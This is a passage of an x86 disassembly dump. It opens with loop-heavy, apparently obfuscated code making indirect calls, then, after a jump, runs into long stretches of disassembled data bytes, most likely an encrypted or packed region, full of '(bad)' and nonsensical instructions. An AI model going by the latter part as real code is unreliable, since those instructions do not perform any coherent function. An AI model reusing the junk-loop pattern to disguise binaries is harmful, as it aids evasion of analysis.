  40fe99:	mov    DWORD PTR ds:0x42b196,ebx
  40fe9f:	cmp    DWORD PTR ds:0x42b196,0x1b
  40fea6:	jae    0x40feef
  40feac:	cmp    DWORD PTR ds:0x42b196,0x6
  40feb3:	jb     0x40feef
  40feb9:	jmp    0x40fece
  40febe:	push   0x42b226
  40fec3:	push   0x42a000
  40fec8:	call   DWORD PTR ds:0x42b2fe
  40fece:	cmp    DWORD PTR ds:0x42b196,0x5
  40fed5:	jne    0x40feea
  40fedb:	xor    ebx,ebx
  40fedd:	add    ebx,DWORD PTR ds:0x42b196
  40fee3:	inc    ebx
  40fee4:	mov    DWORD PTR ds:0x42b196,ebx
  40feea:	jmp    0x40fe92
  40feef:	mov    DWORD PTR [ebp+0x8],edx
  40fef2:	and    DWORD PTR ds:0x42b196,0x0
  40fefc:	jmp    0x40ff10
  40ff01:	xor    ebx,ebx
  40ff03:	xor    ebx,DWORD PTR ds:0x42b196
  40ff09:	inc    ebx
  40ff0a:	mov    DWORD PTR ds:0x42b196,ebx
  40ff10:	cmp    DWORD PTR ds:0x42b196,0x15
  40ff17:	jae    0x40ff62
  40ff1d:	cmp    DWORD PTR ds:0x42b196,0x4
  40ff24:	jb     0x40ff62
  40ff2a:	jmp    0x40ff43
  40ff2f:	push   DWORD PTR [ebp-0xc]
  40ff32:	push   DWORD PTR [ebp-0x1c]
  40ff35:	push   0x42a1d7
  40ff3a:	push   DWORD PTR [ebp-0xc]
  40ff3d:	call   DWORD PTR ds:0x42b306
  40ff43:	cmp    DWORD PTR ds:0x42b196,0x3
  40ff4a:	jne    0x40ff5d
  40ff50:	mov    ebx,DWORD PTR ds:0x42b196
  40ff56:	inc    ebx
  40ff57:	mov    DWORD PTR ds:0x42b196,ebx
  40ff5d:	jmp    0x40ff01
  40ff62:	mov    edx,DWORD PTR [ebp+0x8]
  40ff65:	and    DWORD PTR ds:0x42b21a,0x0
  40ff6f:	jmp    0x40ff81
  40ff74:	mov    ebx,DWORD PTR ds:0x42b21a
  40ff7a:	inc    ebx
  40ff7b:	mov    DWORD PTR ds:0x42b21a,ebx
  40ff81:	cmp    DWORD PTR ds:0x42b21a,0x17
  40ff88:	jae    0x40ffd0
  40ff8e:	cmp    DWORD PTR ds:0x42b21a,0xe
  40ff95:	jb     0x40ffd0
  40ff9b:	jmp    0x40ffb1
  40ffa0:	push   0x42a23f
  40ffa5:	push   DWORD PTR [ebp-0x20]
  40ffa8:	push   DWORD PTR [ebp-0xc]
  40ffab:	call   DWORD PTR ds:0x42b30e
  40ffb1:	cmp    DWORD PTR ds:0x42b21a,0xd
  40ffb8:	jne    0x40ffcb
  40ffbe:	mov    ebx,DWORD PTR ds:0x42b21a
  40ffc4:	inc    ebx
  40ffc5:	mov    DWORD PTR ds:0x42b21a,ebx
  40ffcb:	jmp    0x40ff74
  40ffd0:	mov    ebx,DWORD PTR [ebp-0x58]
  40ffd3:	add    DWORD PTR ds:0x42b20e,0x42b1de
  40ffdd:	add    edx,0x5708e2
  40ffe3:	imul   edx,ebx
  40ffe6:	or     DWORD PTR ds:0x42b1b6,0x7440
  40fff0:	mov    DWORD PTR [ebp-0x58],edx
  40fff3:	sub    DWORD PTR ds:0x42b192,ecx
  40fff9:	jmp    0x412359
  40fffe:	add    al,0x23
  410000:	cld    
  410001:	shl    esp,1
  410003:	mov    al,BYTE PTR [edx]
  410005:	xchg   edx,eax
  410006:	(bad)  
  410009:	retf   0x2df7
  41000c:	(bad)  
  41000d:	iret   
  41000e:	aas    
  41000f:	scas   eax,DWORD PTR es:[edi]
  410010:	add    DWORD PTR [ebx-0x7c7ca1c2],0xffffffc1
  410017:	push   es
  410018:	arpl   WORD PTR [edi],si
  41001a:	sbb    al,0xb9
  41001c:	retf   
  41001d:	xchg   ebx,edi
  41001f:	add    DWORD PTR [eax+eiz*2+0x38f0fea5],ebp
  410026:	dec    ebx
  410027:	call   0xf255f2ab
  41002c:	mov    eax,DWORD PTR [edi+ebx*8+0x3869e6fe]
  410033:	sar    DWORD PTR [ecx-0x36399577],1
  410039:	mov    DWORD PTR [edx+ebx*4-0xd],eax
  41003d:	in     al,0x68
  41003f:	sbb    eax,0x8f4e58ed
  410044:	push   ss
  410045:	mov    eax,0x9d2ef6fe
  41004a:	fsub   st(7),st
  41004c:	dec    ebp
  41004d:	pop    es
  41004e:	sub    BYTE PTR [edx],cl
  410050:	mov    esi,0x9ce1da38
  410055:	jle    0x410047
  410057:	imul   esi,DWORD PTR [ebx],0xffffffaa
  41005a:	cdq    
  41005b:	pop    ebp
  41005c:	lea    edi,[ecx+0x3653a706]
  410062:	jle    0x410023
  410064:	pusha  
  410065:	sbb    BYTE PTR [esi+0x50],0x6
  410069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41006a:	push   ebp
  41006b:	inc    ebx
  41006c:	iret   
  41006d:	popf   
  41006e:	mov    BYTE PTR [edx-0x75],0x38
  410072:	push   ss
  410073:	jne    0x410067
  410075:	les    ecx,FWORD PTR [ebp+ebx*4-0xa]
  410079:	dec    esi
  41007a:	lock or dh,BYTE PTR ds:0x72abf7db
  410081:	repnz aaa 
  410083:	jmp    0x1122ad93
  410088:	sti    
  410089:	xchg   DWORD PTR [edx-0x47de8b66],esi
  41008f:	xor    ebx,esi
  410091:	das    
  410092:	pop    ecx
  410093:	xor    esi,DWORD PTR [edi+0x71308057]
  410099:	les    ebx,FWORD PTR [ebp+0xc05759f]
  41009f:	xchg   edx,eax
  4100a0:	add    BYTE PTR [edi],ch
  4100a2:	shl    DWORD PTR [edi-0x13],cl
  4100a5:	or     dl,BYTE PTR [edx-0x48dbb85e]
  4100ab:	jne    0x4100a2
  4100ad:	hlt    
  4100ae:	or     edx,esp
  4100b0:	mov    DWORD PTR [esi-0x35],ecx
  4100b3:	dec    esp
  4100b4:	enter  0x46a0,0xfe
  4100b8:	cmp    al,0xc5
  4100ba:	jns    0x410083
  4100bc:	cmp    DWORD PTR [ebx],edi
  4100be:	jmp    0x8692d11d
  4100c3:	rcl    ah,0x95
  4100c6:	aaa    
  4100c7:	push   0xddecf8f2
  4100cc:	inc    edi
  4100cd:	mov    edx,0x6b46dd54
  4100d2:	pop    edi
  4100d3:	mov    bl,0x5b
  4100d5:	mov    ch,0x31
  4100d7:	adc    DWORD PTR [ecx+0x44],esi
  4100da:	sbb    ch,BYTE PTR [edi-0x59991751]
  4100e0:	imul   edi,DWORD PTR [ecx+0x7e9b119c],0x33be0bca
  4100ea:	jmp    0xaf676cb8
  4100ef:	and    eax,0x75352674
  4100f4:	add    al,BYTE PTR [edx]
  4100f6:	out    dx,eax
  4100f7:	pop    ecx
  4100f8:	lahf   
  4100f9:	outs   dx,BYTE PTR ds:[esi]
  4100fa:	adc    BYTE PTR [edx-0x26],cl
  4100fd:	test   al,bl
  4100ff:	sub    edi,DWORD PTR [esi]
  410101:	test   DWORD PTR [ebp+0x65226a1],edx
  410107:	mov    edi,0xbe81fb1f
  41010c:	xchg   ecx,eax
  41010d:	loop   0x4100dd
  41010f:	cld    
  410110:	pop    esi
  410111:	fistp  WORD PTR [edx-0x2d46570a]
  410117:	ins    DWORD PTR es:[edi],dx
  410118:	(bad)  
  410119:	ss data16 mov ch,0x28
  41011d:	xchg   ebx,eax
  41011e:	cs inc eax
  410120:	mov    ebx,0x53e98a94
  410125:	hlt    
  410126:	dec    esi
  410127:	pop    ecx
  410128:	or     bh,BYTE PTR [edi]
  41012a:	fisubr DWORD PTR [edx+esi*4-0x26e355e6]
  410131:	pop    ds
  410132:	aad    0x3b
  410134:	cmp    eax,0x6b86e0ea
  410139:	test   DWORD PTR ds:0x7c046e86,esp
  41013f:	jo     0x410123
  410141:	push   ecx
  410142:	xlat   BYTE PTR ds:[ebx]
  410143:	(bad)  
  410144:	es jl  0x4100e3
  410147:	mov    al,0xd
  410149:	(bad)  
  41014b:	cdq    
  41014c:	ds stos BYTE PTR es:[edi],al
  41014e:	pop    esi
  41014f:	cmp    bl,BYTE PTR [eax+0x6a]
  410152:	and    BYTE PTR [ebx-0x69],dh
  410155:	push   ds
  410156:	test   DWORD PTR [ecx-0x6e],edi
  410159:	(bad)  
  41015a:	pop    ss
  41015b:	or     eax,0x395496ba
  410160:	loope  0x41016a
  410162:	ficomp DWORD PTR [edi-0xfcfbca4]
  410168:	test   al,0x26
  41016a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41016c:	pop    esi
  41016d:	stos   BYTE PTR es:[edi],al
  41016e:	and    DWORD PTR [ebx+edi*8+0x69dd2b82],ebp
  410175:	imul   edi,edx,0x45
  410178:	pop    ss
  410179:	test   DWORD PTR [ecx],0x1300a0aa
  41017f:	idiv   DWORD PTR [edx]
  410181:	add    al,0xc4
  410183:	mov    bh,BYTE PTR [ebx+0x7663b32d]
  410189:	ins    DWORD PTR es:[edi],dx
  41018a:	jb     0x410120
  41018c:	push   cs
  41018d:	jo     0x410114
  41018f:	mov    eax,0x49044ad4
  410194:	dec    ebp
  410195:	clc    
  410196:	adc    al,al
  410198:	nop
  410199:	mov    al,ds:0x86e22575
  41019e:	sbb    DWORD PTR [ecx+0x40],edi
  4101a1:	mov    bl,0x7b
  4101a3:	loopne 0x4101d6
  4101a5:	addr16 xchg ebp,eax
  4101a7:	lds    ebx,FWORD PTR [eax-0x55]
  4101aa:	neg    DWORD PTR [esp+esi*4+0x66]
  4101ae:	dec    ebx
  4101af:	aad    0xda
  4101b1:	adc    eax,0x53122c8b
  4101b6:	or     eax,0x9d712326
  4101bb:	mov    BYTE PTR [ecx],ah
  4101bd:	in     eax,dx
  4101be:	pop    eax
  4101bf:	mov    esp,0xa09a98ba
  4101c4:	outs   dx,DWORD PTR ds:[esi]
  4101c5:	(bad)  
  4101c6:	cmp    ch,ch
  4101c8:	push   ecx
  4101c9:	xchg   ecx,eax
  4101ca:	js     0x41018a
  4101cc:	xchg   bl,dh
  4101ce:	repz adc eax,DWORD PTR [eax]
  4101d1:	xor    edi,edx
  4101d3:	pop    edi
  4101d4:	sahf   
  4101d5:	into   
  4101d6:	clc    
  4101d7:	add    al,0x15
  4101d9:	mov    edx,0xb7d8b70f
  4101de:	xor    ecx,eax
  4101e0:	mov    ss,ecx
  4101e2:	xchg   edi,eax
  4101e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e4:	xchg   ebp,eax
  4101e5:	mov    ss,WORD PTR [ecx+0x1]
  4101e8:	inc    edi
  4101e9:	pop    ebp
  4101ea:	sub    eax,0xd1aabb5f
  4101ef:	xor    edi,DWORD PTR [edi-0x63ef46dc]
  4101f5:	in     eax,0xbf
  4101f7:	aaa    
  4101f8:	sub    al,0xe6
  4101fa:	(bad)  
  4101fb:	int    0xfa
  4101fd:	jb     0x410211
  4101ff:	fisttp QWORD PTR [eax+0x1817aa40]
  410205:	into   
  410206:	stc    
  410207:	add    al,0x48
  410209:	out    dx,al
  41020a:	js     0x410215
  41020c:	xchg   esp,eax
  41020d:	scas   al,BYTE PTR es:[edi]
  41020e:	iret   
  41020f:	and    DWORD PTR [ecx+0x68],edx
  410212:	xchg   edi,eax
  410213:	jb     0x410230
  410215:	xchg   edi,eax
  410216:	xor    al,0x21
  410218:	test   eax,0xe8dafb01
  41021d:	xor    al,0xbd
  41021f:	add    ebx,DWORD PTR [eax]
  410221:	pop    ds
  410222:	test   al,0x82
  410224:	sbb    al,0x3e
  410226:	test   ch,bh
  410228:	stc    
  410229:	sbb    ecx,eax
  41022b:	sti    
  41022c:	in     al,dx
  41022d:	lea    esi,[eax]
  41022f:	lea    ebx,[edi-0x7d]
  410232:	lds    edx,FWORD PTR [ebp-0x5e]
  410235:	mov    edi,0x72413f2e
  41023a:	test   DWORD PTR [edi+0x1954a93b],edx
  410240:	cmc    
  410241:	out    0xb3,eax
  410243:	pop    esp
  410244:	out    dx,al
  410245:	ins    BYTE PTR es:[edi],dx
  410246:	cdq    
  410247:	pop    edx
  410248:	inc    ebx
  410249:	mov    eax,ds:0xbad174df
  41024e:	dec    ebx
  41024f:	push   edx
  410250:	xchg   BYTE PTR [ebx+0x3d],ah
  410253:	fmul   DWORD PTR [eax-0x46]
  410256:	aaa    
  410257:	mov    gs,WORD PTR [ebp+eax*4-0x68]
  41025b:	ror    BYTE PTR ds:0x82f028be,1
  410261:	imul   esp,DWORD PTR [esi+0x25a35deb],0x63
  410268:	xchg   esi,eax
  410269:	clc    
  41026a:	cmp    dl,BYTE PTR [ebp-0x5688db3f]
  410270:	out    0xc3,al
  410272:	dec    esp
  410273:	pop    edx
  410274:	std    
  410275:	sub    DWORD PTR [edi+ebx*2+0x49fd2dc],ebx
  41027c:	fild   WORD PTR [ebp-0x1]
  41027f:	sub    ebx,DWORD PTR [ebx]
  410281:	mov    esi,0xe99f9a8f
  410286:	rcl    BYTE PTR [esi+0xb],0x84
  41028a:	sbb    al,0x9c
  41028c:	es test bh,0xdd
  410290:	popa   
  410291:	sub    al,BYTE PTR [edx]
  410293:	cmp    DWORD PTR [esi+0x1d],esi
  410296:	fisttp QWORD PTR [eax]
  410298:	add    DWORD PTR [ebp-0x3286b3b0],0x3f03e8c7
  4102a2:	fmul   st,st(7)
  4102a4:	and    eax,0xb8749f87
  4102a9:	lahf   
  4102aa:	sub    eax,0xaaecfbc9
  4102af:	ret    
  4102b0:	in     al,dx
  4102b1:	lods   al,BYTE PTR ds:[esi]
  4102b2:	sbb    DWORD PTR [ecx+0x14894727],0x7637b1a2
  4102bc:	and    edx,ecx
  4102be:	fs in  eax,0x4c
  4102c1:	test   eax,0x9481557a
  4102c6:	inc    edi
  4102c7:	mov    edx,DWORD PTR [esi+ebp*4+0x35e28474]
  4102ce:	mov    al,0x63
  4102d0:	fdivr  st(5),st
  4102d2:	les    esp,FWORD PTR [edx+0xd]
  4102d5:	shr    DWORD PTR [bp-0x2708],1
  4102da:	mov    esi,DWORD PTR [ecx]
  4102dc:	jb     0x4102d0
  4102de:	mov    ebx,0x83fbd2fb
  4102e3:	or     bl,al
  4102e5:	ins    DWORD PTR es:[edi],dx
  4102e6:	out    dx,al
  4102e7:	lods   eax,DWORD PTR ds:[esi]
  4102e8:	mul    BYTE PTR [edx]
  4102ea:	in     al,0xe9
  4102ec:	dec    edi
  4102ed:	into   
  4102ee:	aad    0xbd
  4102f0:	mov    ds:0x5cf6ea21,eax
  4102f5:	fcmovu st,st(3)
  4102f7:	adc    DWORD PTR [ecx],edi
  4102f9:	add    BYTE PTR [eax+0x3b36cf77],dl
  4102ff:	retf   
  410300:	lods   al,BYTE PTR ds:[esi]
  410301:	aas    
  410302:	sub    ecx,ecx
  410304:	push   ss
  410305:	sahf   
  410306:	and    dh,cl
  410308:	dec    eax
  410309:	stos   DWORD PTR es:[edi],eax
  41030a:	push   ecx
  41030b:	lods   al,BYTE PTR ds:[esi]
  41030c:	ins    DWORD PTR es:[edi],dx
  41030d:	xor    eax,0xfca6780a
  410312:	dec    ebx
  410313:	mov    WORD PTR [edx],?
  410315:	sbb    BYTE PTR [ecx-0x4731220d],dl
  41031b:	jne    0x41033d
  41031d:	pop    ss
  41031e:	dec    eax
  41031f:	mov    al,0x99
  410321:	mov    ah,0xde
  410323:	shrd   DWORD PTR [ebp-0x55],ecx,cl
  410327:	div    bh
  410329:	rcr    BYTE PTR [esi],cl
  41032b:	fnclex 
  41032d:	sbb    al,0x83
  41032f:	dec    ebx
  410330:	pop    es
  410331:	push   edx
  410332:	test   BYTE PTR [eax-0x190da658],al
  410338:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41033a:	leave  
  41033b:	daa    
  41033c:	rcl    DWORD PTR [edx+0x5c],cl
  41033f:	cmp    cl,BYTE PTR [esi+0x2b3227f]
  410345:	lahf   
  410346:	je     0x410347
  410348:	ret    0x86e9
  41034b:	adc    DWORD PTR [eax-0x7840f2a2],ecx
  410351:	sub    al,0xc6
  410353:	aaa    
  410354:	or     dh,dl
  410356:	leave  
  410357:	adc    edi,DWORD PTR [esi-0x470372c5]
  41035d:	cmp    ebx,DWORD PTR [esi]
  41035f:	push   0x7ebd9c53
  410364:	fbld   TBYTE PTR [ecx+0x1a]
  410367:	mov    esi,0xa671c605
  41036c:	ss push bx
  41036f:	lods   eax,DWORD PTR ds:[esi]
  410370:	sub    al,0x49
  410372:	xor    edi,DWORD PTR [edi]
  410374:	popf   
  410375:	inc    ebx
  410376:	xor    ecx,DWORD PTR [ebp+0x6f]
  410379:	pop    eax
  41037a:	add    bh,BYTE PTR [esi]
  41037c:	mov    al,ds:0x2ae1d014
  410381:	sahf   
  410382:	jb     0x41039e
  410384:	ja     0x410337
  410386:	jns    0x4103cf
  410388:	pop    eax
  410389:	add    ebx,ecx
  41038b:	cmp    al,0xee
  41038d:	loop   0x4103d9
  41038f:	std    
  410390:	cdq    
  410391:	aas    
  410392:	and    bl,dl
  410394:	loopne 0x410318
  410396:	push   ebp
  410397:	shl    DWORD PTR ds:0xffff5e20,1
  41039d:	push   ds
  41039e:	jne    0x4103a0
  4103a0:	pushf  
  4103a1:	inc    eax
  4103a2:	arpl   WORD PTR [ebx+ecx*1-0x39],dx
  4103a6:	xor    bh,BYTE PTR es:[edx-0x74]
  4103aa:	pop    edi
  4103ab:	jns    0x410379
  4103ad:	mov    ch,0xc8
  4103af:	inc    ebx
  4103b0:	mov    ebp,0x16aac086
  4103b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103b6:	xor    al,dh
  4103b8:	repz (bad) 
  4103ba:	leave  
  4103bb:	mov    al,0xf8
  4103bd:	pop    edx
  4103be:	outs   dx,DWORD PTR ds:[esi]
  4103bf:	jnp    0x410399
  4103c1:	add    eax,DWORD PTR [edi-0x5b971ce0]
  4103c7:	adc    bl,BYTE PTR [eax+edi*1]
  4103ca:	or     BYTE PTR [esp+ecx*4+0x4f49dedc],0x53
  4103d2:	ret    
  4103d3:	sbb    bl,BYTE PTR [edx]
  4103d5:	aam    0x71
  4103d7:	out    0x4d,eax
  4103d9:	loope  0x4103cb
  4103db:	cli    
  4103dc:	sub    BYTE PTR ds:0xc1d4de65,bh
  4103e2:	and    dl,BYTE PTR ds:0x85a51ef
  4103e8:	xor    ecx,0xffffffee
  4103eb:	lea    ecx,[edi+edx*8]
  4103ee:	cmc    
  4103ef:	or     dh,dh
  4103f1:	and    eax,DWORD PTR ds:0xc67a1748
  4103f7:	xchg   BYTE PTR [edi-0x55395c24],bh
  4103fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103fe:	inc    eax
  4103ff:	enter  0xf273,0x74
  410403:	xor    al,0xa2
  410405:	stos   BYTE PTR es:[edi],al
  410406:	ins    DWORD PTR es:[edi],dx
  410407:	push   eax
  410408:	int    0x8a
  41040a:	pop    edx
  41040b:	fs cmp eax,0x869a5404
  410411:	sub    edi,DWORD PTR [esi+0x75]
  410414:	sbb    BYTE PTR [ebp*4+0x7372055d],al
  41041b:	(bad)  
  41041c:	in     eax,dx
  41041d:	bound  edx,QWORD PTR [ebx-0x7b]
  410420:	adc    eax,0x6fd91d90
  410425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410426:	mov    esi,0x2b47f397
  41042b:	nop
  41042c:	fmulp  st(1),st
  41042e:	scas   al,BYTE PTR es:[edi]
  41042f:	pop    es
  410430:	xchg   ebx,eax
  410431:	inc    esp
  410432:	add    al,ah
  410434:	fwait
  410435:	(bad)  
  410436:	lods   al,BYTE PTR ds:[esi]
  410437:	and    ch,BYTE PTR [edi-0x3a]
  41043a:	xchg   ecx,eax
  41043b:	cmp    ebp,edi
  41043d:	arpl   WORD PTR [esi+0xf],bx
  410440:	mov    edi,0x2e67eff3
  410445:	pop    esp
  410446:	inc    esp
  410447:	mov    fs,esp
  410449:	enter  0x1a93,0x9
  41044d:	mov    eax,0xc2fe60c3
  410452:	cmp    eax,edx
  410454:	or     BYTE PTR [edi],0xa7
  410457:	mov    al,ds:0x559af046
  41045c:	adc    al,0x9f
  41045e:	cmp    BYTE PTR [ecx+0x27],bl
  410461:	bound  esp,QWORD PTR [eax+0x4159669b]
  410467:	mov    dl,0xd8
  410469:	pop    edx
  41046a:	jbe    0x4104e4
  41046c:	push   edi
  41046d:	dec    edi
  41046e:	mov    ah,0x2c
  410470:	sbb    cl,BYTE PTR [esi-0x2937003f]
  410476:	push   edx
  410477:	xchg   esp,eax
  410478:	mov    bl,0xe0
  41047a:	ins    DWORD PTR es:[edi],dx
  41047b:	popa   
  41047c:	nop
  41047d:	jmp    0x4104e1
  41047f:	mov    esp,0x204b2539
  410484:	cmp    esp,ebp
  410486:	sub    DWORD PTR [edi],esp
  410488:	js     0x4104ed
  41048a:	mov    ds:0xd490ba7e,eax
  41048f:	push   esi
  410490:	cmp    BYTE PTR [edi-0x2dad1ee5],dh
  410496:	fidiv  DWORD PTR [eax-0x4bdecaf2]
  41049c:	sbb    esp,edx
  41049e:	inc    edx
  41049f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a0:	adc    eax,0x2e55451d
  4104a5:	scas   al,BYTE PTR es:[edi]
  4104a6:	push   ss
  4104a7:	jb     0x410443
  4104a9:	push   es
  4104aa:	xlat   BYTE PTR ds:[ebx]
  4104ab:	(bad)  
  4104ac:	push   ebp
  4104ad:	aaa    
  4104ae:	mov    ebx,0xffd09ec0
  4104b3:	jno    0x4104c3
  4104b5:	push   edi
  4104b6:	fwait
  4104b7:	adc    esi,DWORD PTR [esi+edx*8-0x2b25622d]
  4104be:	mov    cl,0xf8
  4104c0:	aaa    
  4104c1:	mov    BYTE PTR [ecx+0x760ba79f],ch
  4104c7:	xchg   edi,eax
  4104c8:	in     al,0x63
  4104ca:	loopne 0x41054b
  4104cc:	pop    ebx
  4104cd:	add    al,0x35
  4104cf:	aas    
  4104d0:	ss in  al,0xe5
  4104d3:	lea    esp,[esp+ecx*4+0x5afcd1d3]
  4104da:	push   edx
  4104db:	out    dx,al
  4104dc:	loopne 0x4104c5
  4104de:	sbb    al,0x76
  4104e0:	push   edi
  4104e1:	ret    0x7bd6
  4104e4:	add    al,0x10
  4104e6:	push   ds
  4104e7:	in     eax,dx
  4104e8:	mov    ds:0x78380029,eax
  4104ed:	pusha  
  4104ee:	addr16 mov ah,0x96
  4104f1:	sub    BYTE PTR [edi],bl
  4104f3:	and    BYTE PTR [edx+0x3b],0x72
  4104f7:	dec    esp
  4104f8:	(bad)  
  4104f9:	xchg   esi,eax
  4104fa:	aas    
  4104fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104fc:	inc    edi
  4104fd:	retf   
  4104fe:	jmp    0x4104f4
  410500:	xchg   DWORD PTR [ebp-0x19],edx
  410503:	pop    ss
  410504:	ret    0xa9a8
  410507:	ja     0x4104bf
  410509:	and    ah,dl
  41050b:	pmaddwd mm2,QWORD PTR [edi+0x18eacaf5]
  410512:	fcomp  QWORD PTR [eax+0x62]
  410515:	je     0x4104df
  410517:	mov    al,0x0
  410519:	mov    bl,0xa7
  41051b:	add    edi,DWORD PTR [ebx+0x2fef67df]
  410521:	jbe    0x41057b
  410523:	xlat   BYTE PTR ds:[ebx]
  410524:	jnp    0x410552
  410526:	jg     0x410581
  410528:	sub    al,0xa
  41052a:	cmp    eax,0xd47e4e08
  41052f:	daa    
  410530:	cmp    al,0x31
  410532:	push   edx
  410533:	sub    al,0xda
  410535:	mov    bh,0x6a
  410537:	out    dx,eax
  410538:	sbb    DWORD PTR [ecx-0x2a733856],esi
  41053e:	inc    DWORD PTR [eax+ebx*1+0x3f]
  410542:	or     dl,BYTE PTR [ebp-0x5e55cad5]
  410548:	mov    esp,0xbfc2128
  41054d:	in     eax,0x1a
  41054f:	gs ss jnp 0x4104dc
  410553:	pop    edi
  410554:	mov    al,ds:0xcbebc57a
  410559:	cli    
  41055a:	cmp    dl,BYTE PTR [di]
  41055d:	test   DWORD PTR [edx+0x4c3822c9],ebx
  410563:	outs   dx,BYTE PTR ds:[esi]
  410564:	in     eax,0xd
  410566:	ds pop ecx
  410568:	mov    dl,0x69
  41056a:	xchg   edx,eax
  41056b:	jge    0x41053a
  41056d:	lock push ebp
  41056f:	add    DWORD PTR [esp+ecx*2],edi
  410572:	xchg   esi,eax
  410573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410574:	jp     0x410558
  410576:	pop    edi
  410577:	daa    
  410578:	mov    ebx,0x61f7e34d
  41057d:	fisubr WORD PTR [edx-0x6]
  410580:	pop    esp
  410581:	push   0x87965aef
  410586:	and    BYTE PTR [edx-0xca8657d],bh
  41058c:	pop    edx
  41058d:	fs mov eax,0x16adc5bb
  410593:	sub    eax,0x28ce6d14
  410598:	test   bl,bh
  41059a:	into   
  41059b:	sub    ebx,DWORD PTR [ebp+0x46]
  41059e:	sub    bh,cl
  4105a0:	xlat   BYTE PTR ds:[ebx]
  4105a1:	not    DWORD PTR [eax]
  4105a3:	jg     0x4105b1
  4105a5:	(bad)  
  4105a6:	cmp    BYTE PTR [edi+0x6ece9d93],bh
  4105ac:	stc    
  4105ad:	pop    ebx
  4105ae:	and    BYTE PTR [ebx-0x12],0x4c
  4105b2:	push   ebp
  4105b3:	xchg   edi,eax
  4105b4:	jno    0x4105cb
  4105b6:	scas   eax,DWORD PTR es:[edi]
  4105b7:	pop    ds
  4105b8:	xor    dl,BYTE PTR [ebp-0x7504b12c]
  4105be:	mov    eax,DWORD PTR [ecx+0x12ba250]
  4105c4:	or     BYTE PTR [ebx-0x314c3418],bl
  4105ca:	add    ah,0xf3
  4105cd:	(bad)  
  4105cf:	rcl    al,1
  4105d1:	add    al,0xc6
  4105d3:	mov    WORD PTR ds:0x2ede7381,es
  4105d9:	push   edx
  4105da:	jno    0x4105bf
  4105dc:	push   esi
  4105dd:	sti    
  4105de:	lods   eax,DWORD PTR ds:[esi]
  4105df:	dec    esp
  4105e0:	fcomip st,st(3)
  4105e2:	(bad)  
  4105e3:	sti    
  4105e4:	addr16 cmc 
  4105e6:	test   BYTE PTR ds:0x8bfce065,0xda
  4105ed:	xor    BYTE PTR [ecx+0x5a],dh
  4105f0:	mov    esp,0xc4b2c3c8
  4105f5:	sub    al,0x93
  4105f7:	repz imul ebx,esi,0x2
  4105fb:	icebp  
  4105fc:	mov    eax,ds:0xc4ba24a5
  410601:	sbb    edi,DWORD PTR [eax-0x14]
  410604:	cmp    BYTE PTR [edi],dh
  410606:	inc    ecx
  410607:	push   edx
  410608:	inc    ebx
  410609:	cmp    eax,0x6c30fb5d
  41060e:	jns    0x41068b
  410610:	mov    WORD PTR [esi],?
  410612:	(bad)  [ecx+eiz*2-0x5760b8d]
  410619:	mov    ebx,edx
  41061b:	sbb    ecx,DWORD PTR [edx+0x44]
  41061e:	mov    bh,0x66
  410620:	jecxz  0x4105d5
  410622:	sti    
  410623:	or     eax,0x5b432c59
  410628:	pop    ecx
  410629:	xor    DWORD PTR [esi-0x20],edx
  41062c:	stc    
  41062d:	mov    ebp,0x3512190d
  410632:	je     0x4105e0
  410634:	retf   
  410635:	scas   eax,DWORD PTR es:[edi]
  410636:	pmulhuw mm6,QWORD PTR [eax+edx*1]
  41063a:	push   ebp
  41063b:	mov    WORD PTR [esi],?
  41063d:	cmp    al,0xd7
  41063f:	lea    edi,[ecx+0x0]
  410642:	or     ch,BYTE PTR [edx]
  410644:	mov    ebp,0x197dd8e4
  410649:	xor    dl,BYTE PTR [edx-0x431720bf]
  41064f:	jp     0x41068e
  410651:	fwait
  410652:	dec    eax
  410653:	push   edx
  410654:	mov    ah,0x53
  410656:	jecxz  0x4105de
  410658:	repz std 
  41065a:	(bad)  
  41065c:	clc    
  41065d:	dec    edi
  41065e:	inc    ebx
  41065f:	pop    DWORD PTR [esi-0x16]
  410662:	jg     0x410698
  410664:	pop    esp
  410665:	cmp    BYTE PTR [esi+0x321a8a72],ah
  41066b:	mov    ebx,0x12b295e4
  410670:	mov    BYTE PTR [eax],dh
  410672:	cmp    BYTE PTR [ebp+0x21a1b3ba],bl
  410678:	inc    esi
  410679:	pop    esi
  41067a:	aam    0x14
  41067c:	ficomp WORD PTR [ebp-0x3fe3fbd6]
  410682:	shr    BYTE PTR [ecx+0x518948b3],0x8d
  410689:	(bad)  
  41068b:	push   ecx
  41068c:	mov    ds:0x8f7e4442,eax
  410691:	out    0x2,al
  410693:	cmp    ecx,DWORD PTR [ecx]
  410695:	adc    DWORD PTR [esi+0x37ef4dd6],ebx
  41069b:	arpl   WORD PTR [ecx+0x55],bp
  41069e:	fld    QWORD PTR [ebx+0xe4b7c61]
  4106a4:	repz pop ebx
  4106a6:	leave  
  4106a7:	jnp    0x410671
  4106a9:	(bad)  
  4106aa:	and    ecx,edx
  4106ac:	jmp    0x4106b8
  4106ae:	es push ds
  4106b0:	fwait
  4106b1:	stos   DWORD PTR es:[edi],eax
  4106b2:	enter  0x9711,0x39
  4106b6:	add    al,BYTE PTR [ebx+ebp*4]
  4106b9:	sbb    al,0xb5
  4106bb:	push   0xfffffffa
  4106bd:	je     0x410659
  4106bf:	leave  
  4106c0:	sahf   
  4106c1:	sbb    DWORD PTR [ebx+0x1e],ebx
  4106c4:	fldcw  WORD PTR [edx+0x0]
  4106c7:	push   edx
  4106c8:	or     ch,dh
  4106ca:	out    0xb3,eax
  4106cc:	dec    eax
  4106cd:	pop    ebp
  4106ce:	(bad)  
  4106cf:	cld    
  4106d0:	cmp    BYTE PTR [ecx+0x67],bh
  4106d3:	dec    ebx
  4106d4:	cmc    
  4106d5:	mov    edx,0x8b7f2671
  4106da:	pop    edx
  4106db:	xchg   ebx,eax
  4106dc:	bound  eax,QWORD PTR [esp+edx*4-0x5fce675f]
  4106e3:	scas   eax,DWORD PTR es:[edi]
  4106e4:	jbe    0x410751
